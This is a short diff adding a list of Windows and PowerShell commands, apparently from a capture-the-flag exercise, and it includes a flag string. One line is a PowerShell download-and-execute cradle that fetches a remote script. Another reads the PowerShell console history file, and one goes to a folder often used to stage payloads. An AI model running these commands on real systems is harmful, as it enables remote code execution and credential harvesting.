@@ -1,0 +1,11 @@
+ls
+dir
+Get-Content test
+flag{a12a41b5f8111327690f836e9b302f0b}
+iex(new-object net.webclient).DownloadString('http://127.0.0.1/test.ps1')
+cls
+exit
+cd C:\Windows\System32\spool\drivers\color
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+cd %userprofile%
+cd %appdata%
